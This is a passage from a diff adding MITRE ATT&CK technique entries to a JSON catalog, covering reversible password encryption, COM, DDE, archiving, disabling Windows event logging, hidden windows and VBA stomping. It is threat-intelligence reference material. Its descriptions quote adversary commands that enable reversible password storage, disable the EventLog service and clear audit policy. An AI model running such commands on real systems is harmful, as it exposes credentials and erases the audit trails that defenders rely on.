[PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.",
+    "technique_references": [
+      {
+        "source_name": "store_pwd_rev_enc",
+        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption",
+        "description": "Microsoft. (2021, October 28). Store passwords using reversible encryption. Retrieved January 3, 2022.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "how_pwd_rev_enc_1",
+        "url": "http://blog.teusink.net/2009/08/passwords-stored-using-reversible.html",
+        "description": "Teusink, N. (2009, August 25). Passwords stored using reversible encryption: how it works (part 1). Retrieved November 17, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "how_pwd_rev_enc_2",
+        "url": "http://blog.teusink.net/2009/08/passwords-stored-using-reversible_26.html",
+        "description": "Teusink, N. (2009, August 26). Passwords stored using reversible encryption: how it works (part 2). Retrieved November 17, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "dump_pwd_dcsync",
+        "url": "https://adsecurity.org/?p=2053",
+        "description": "Metcalf, S. (2015, November 22). Dump Clear-Text Passwords for All Admins in the Domain Using Mimikatz DCSync. Retrieved November 15, 2021.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "user|administrator",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--d50955c2-272d-4ac8-95da-10c29dda1c48",
+    "platform": "windows",
+    "tid": "T1556.005",
+    "technique": "Reversible Encryption",
+    "tactic": "persistence",
+    "datasources": "script-execution",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)\n\nIf the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:\n\n1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>\n2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>\n3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)\n4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)\n\nWith this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)\n\nAn adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.",
+    "technique_references": [
+      {
+        "source_name": "store_pwd_rev_enc",
+        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption",
+        "description": "Microsoft. (2021, October 28). Store passwords using reversible encryption. Retrieved January 3, 2022.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "how_pwd_rev_enc_1",
+        "url": "http://blog.teusink.net/2009/08/passwords-stored-using-reversible.html",
+        "description": "Teusink, N. (2009, August 25). Passwords stored using reversible encryption: how it works (part 1). Retrieved November 17, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "how_pwd_rev_enc_2",
+        "url": "http://blog.teusink.net/2009/08/passwords-stored-using-reversible_26.html",
+        "description": "Teusink, N. (2009, August 26). Passwords stored using reversible encryption: how it works (part 2). Retrieved November 17, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "dump_pwd_dcsync",
+        "url": "https://adsecurity.org/?p=2053",
+        "description": "Metcalf, S. (2015, November 22). Dump Clear-Text Passwords for All Admins in the Domain Using Mimikatz DCSync. Retrieved November 15, 2021.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "user|administrator",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--2f6b4ed7-fef1-44ba-bcb8-1b4beb610b64",
+    "platform": "windows",
+    "tid": "T1559.001",
+    "technique": "Component Object Model",
+    "tactic": "execution",
+    "datasources": "script-execution",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)",
+    "technique_references": [
+      {
+        "source_name": "Fireeye Hunting COM June 2019",
+        "url": "https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html",
+        "description": "Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June 10, 2019.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Microsoft COM",
+        "url": "https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx",
+        "description": "Microsoft. (n.d.). Component Object Model (COM). Retrieved November 22, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "ProjectZero File Write EoP Apr 2018",
+        "url": "https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html",
+        "description": "Forshaw, J. (2018, April 18). Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege. Retrieved May 3, 2018.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Enigma Outlook DCOM Lateral Movement Nov 2017",
+        "url": "https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/",
+        "description": "Nelson, M. (2017, November 16). Lateral Movement using Outlook's CreateObject Method and DotNetToJScript. Retrieved November 21, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Enigma MMC20 COM Jan 2017",
+        "url": "https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/",
+        "description": "Nelson, M. (2017, January 5). Lateral Movement using the MMC20 Application COM Object. Retrieved November 21, 2017.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--232a7e42-cd6e-4902-8fe9-2960f529dd4d",
+    "platform": "windows",
+    "tid": "T1559.002",
+    "technique": "Dynamic Data Exchange",
+    "tactic": "execution",
+    "datasources": "script-execution",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)\n\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )\n\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)",
+    "technique_references": [
+      {
+        "source_name": "BleepingComputer DDE Disabled in Word Dec 2017",
+        "url": "https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/",
+        "description": "Cimpanu, C. (2017, December 15). Microsoft Disables DDE Feature in Word to Prevent Further Malware Attacks. Retrieved December 19, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Microsoft ADV170021 Dec 2017",
+        "url": "https://portal.msrc.microsoft.com/security-guidance/advisory/ADV170021",
+        "description": "Microsoft. (2017, December 12). ADV170021 - Microsoft Office Defense in Depth Update. Retrieved February 3, 2018.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Microsoft DDE Advisory Nov 2017",
+        "url": "https://technet.microsoft.com/library/security/4053440",
+        "description": "Microsoft. (2017, November 8). Microsoft Security Advisory 4053440 - Securely opening Microsoft Office documents that contain Dynamic Data Exchange (DDE) fields. Retrieved November 21, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "SensePost PS DDE May 2016",
+        "url": "https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/",
+        "description": "El-Sherei, S. (2016, May 20). PowerShell, C-Sharp and DDE The Power Within. Retrieved November 22, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Kettle CSV DDE Aug 2014",
+        "url": "https://www.contextis.com/blog/comma-separated-vulnerabilities",
+        "description": "Kettle, J. (2014, August 29). Comma Separated Vulnerabilities. Retrieved November 22, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Enigma Reviving DDE Jan 2018",
+        "url": "https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee",
+        "description": "Nelson, M. (2018, January 29). Reviving DDE: Using OneNote and Excel for Code Execution. Retrieved February 3, 2018.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "SensePost MacroLess DDE Oct 2017",
+        "url": "https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/",
+        "description": "Stalmans, E., El-Sherei, S. (2017, October 9). Macro-less Code Exec in MSWord. Retrieved November 21, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "OWASP CSV Injection",
+        "url": "https://owasp.org/www-community/attacks/CSV_Injection",
+        "description": " Albinowax Timo Goosen. (n.d.). CSV Injection. Retrieved February 7, 2022.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "CSV Excel Macro Injection ",
+        "url": "https://blog.securelayer7.net/how-to-perform-csv-excel-macro-injection/",
+        "description": " Ishaq Mohammed . (2021, January 10). Everything about CSV Injection and CSV Excel Macro Injection. Retrieved February 7, 2022.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Fireeye Hunting COM June 2019",
+        "url": "https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html",
+        "description": "Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June 10, 2019.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "NVisio Labs DDE Detection Oct 2017",
+        "url": "https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/",
+        "description": "NVISO Labs. (2017, October 11). Detecting DDE in MS Office documents. Retrieved November 21, 2017.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "user",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--41868330-6ee2-4d0f-b743-9f2294c3c9b6",
+    "platform": "linux|macos|windows",
+    "tid": "T1560.002",
+    "technique": "Archive via Library",
+    "tactic": "collection",
+    "datasources": "script-execution",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.\n\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",
+    "technique_references": [
+      {
+        "source_name": "PyPI RAR",
+        "url": "https://pypi.org/project/rarfile/",
+        "description": "mkz. (2020). rarfile 3.1. Retrieved February 20, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "libzip",
+        "url": "https://libzip.org/",
+        "description": "D. Baron, T. Klausner. (2020). libzip. Retrieved February 20, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Zlib Github",
+        "url": "https://github.com/madler/zlib",
+        "description": "madler. (2017). zlib. Retrieved February 20, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Wikipedia File Header Signatures",
+        "url": "https://en.wikipedia.org/wiki/List_of_file_signatures",
+        "description": "Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--143c0cbb-a297-4142-9624-87ffc778980b",
+    "platform": "linux|macos|windows",
+    "tid": "T1560.003",
+    "technique": "Archive via Custom Method",
+    "tactic": "collection",
+    "datasources": "script-execution",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.(Citation: ESET Sednit Part 2)",
+    "technique_references": [
+      {
+        "source_name": "ESET Sednit Part 2",
+        "url": "http://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-part-2.pdf",
+        "description": "ESET. (2016, October). En Route with Sednit - Part 2: Observing the Comings and Goings. Retrieved November 21, 2016.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
+    "platform": "windows",
+    "tid": "T1562.002",
+    "technique": "Disable Windows Event Logging",
+    "tactic": "defense-evasion",
+    "datasources": "script-execution",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the “Start” value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
+    "technique_references": [
+      {
+        "source_name": "Disable_Win_Event_Logging",
+        "url": "https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1562-impair-defenses/disable-windows-event-logging",
+        "description": " dmcxblue. (n.d.). Disable Windows Event Logging. Retrieved September 10, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "def_ev_win_event_logging",
+        "url": "https://www.hackingarticles.in/defense-evasion-windows-event-logging-t1562-002/",
+        "description": "Chandel, R. (2021, April 22). Defense Evasion: Windows Event Logging (T1562.002). Retrieved September 14, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "EventLog_Core_Technologies",
+        "url": "https://www.coretechnologies.com/blog/windows-services/eventlog/",
+        "description": "Core Technologies. (2021, May 24). Essential Windows Services: EventLog / Windows Event Log. Retrieved September 14, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Audit_Policy_Microsoft",
+        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/audit-policy",
+        "description": "Daniel Simpson. (2017, April 19). Audit Policy. Retrieved September 13, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Windows Log Events",
+        "url": "https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/",
+        "description": "Franklin Smith. (n.d.). Windows Security Log Events. Retrieved February 21, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "disable_win_evt_logging",
+        "url": "https://ptylu.github.io/content/report/report.html?report=25",
+        "description": "Heiligenstein, L. (n.d.). REP-25: Disable Windows Event Logging. Retrieved April 7, 2022.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "auditpol",
+        "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol",
+        "description": "Jason Gerend, et al. (2017, October 16). auditpol. Retrieved September 1, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "winser19_file_overwrite_bug_twitter",
+        "url": "https://web.archive.org/web/20211107115646/https://twitter.com/klinix5/status/1457316029114327040",
+        "description": "Naceri, A. (2021, November 7). Windows Server 2019 file overwrite bug. Retrieved April 7, 2022.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "T1562.002_redcanaryco",
+        "url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.002/T1562.002.md",
+        "description": "redcanaryco. (2021, September 3). T1562.002 - Disable Windows Event Logging. Retrieved September 13, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Advanced_sec_audit_policy_settings",
+        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/advanced-security-audit-policy-settings",
+        "description": "Simpson, D. et al. (2017, April 19). Advanced security audit policy settings. Retrieved September 14, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "auditpol.exe_STRONTIC",
+        "url": "https://strontic.github.io/xcyclopedia/library/auditpol.exe-214E0EA1F7F7C27C82D23F183F9D23F1.html",
+        "description": "STRONTIC. (n.d.). auditpol.exe. Retrieved September 9, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "evt_log_tampering",
+        "url": "https://svch0st.medium.com/event-log-tampering-part-1-disrupting-the-eventlog-service-8d4b7d67335c",
+        "description": "svch0st. (2020, September 30). Event Log Tampering Part 1: Disrupting the EventLog Service. Retrieved September 14, 2021.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0",
+    "platform": "macos|windows|linux",
+    "tid": "T1564.003",
+    "technique": "Hidden Window",
+    "tactic": "defense-evasion",
+    "datasources": "script-execution",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nOn Windows, there are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. (Citation: PowerShell About 2019)\n\nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)",
+    "technique_references": [
+      {
+        "source_name": "PowerShell About 2019",
+        "url": "https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/About/about_PowerShell_exe?view=powershell-5.1",
+        "description": "Wheeler, S. et al.. (2019, May 1). About PowerShell.exe. Retrieved October 11, 2019.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Antiquated Mac Malware",
+        "url": "https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/",
+        "description": "Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "user",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--c898c4b5-bf36-4e6e-a4ad-5b8c4c13e35b",
+    "platform": "linux|windows|macos",
+    "tid": "T1564.007",
+    "technique": "VBA Stomping",
+    "tactic": "defense-evasion",
+    "datasources": "script-execution",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.(Citation: FireEye VBA stomp Feb 2020)\n\nMS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.(Citation: Evil Clippy May 2019)(Citation: Microsoft _VBA_PROJECT Stream)\n\nAn adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <code>_VBA_PROJECT</code> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation: FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev)",
+    "technique_references": [
+      {
+        "source_name": "FireEye VBA stomp Feb 2020",
+        "url": "https://www.fireeye.com/blog/threat-research/2020/01/stomp-2-dis-brilliance-in-the-visual-basics.html",
+        "description": "Cole, R., Moore, A., Stark, G., Stancill, B. (2020, February 5). STOMP 2 DIS: Brilliance in the (Visual) Basics. Retrieved September 17, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Evil Clippy May 2019",
+        "url": "https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/",
+        "description": "Hegt, S. (2019, May 5). Evil Clippy: MS Office maldoc assistant. Retrieved September 17, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Microsoft _VBA_PROJECT Stream",
+        "url": "https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/ef7087ac-3974-4452-aab2-7dba2214d239",
+        "description": "Microsoft. (2020, February 19). 2.3.4.1 _VBA_PROJECT Stream: Version Dependent Project Information. Retrieved September 18, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Walmart Roberts Oct 2018",
+        "url": "https://medium.com/walmartglobaltech/vba-stomping-advanced-maldoc-techniques-612c484ab278",
+        "description": "Sayre, K., Ogden, H., Roberts, C. (2018, October 10). VBA Stomping — Advanced Maldoc Techniques. Retrieved September 17, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "pcodedmp Bontchev",
+        "url": "https://github.com/bontchev/pcodedmp",
+        "description": "Bontchev, V. (2019, July 30). pcodedmp.py - A VBA p-code disassembler. Retrieved September 17, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "oletools toolkit",
+        "url": "https://github.com/decalage2/oletools",
+        "description": "decalage2. (2019, December 3). python-oletools. Retrieved September 18, 2020.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "user",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  }
+]
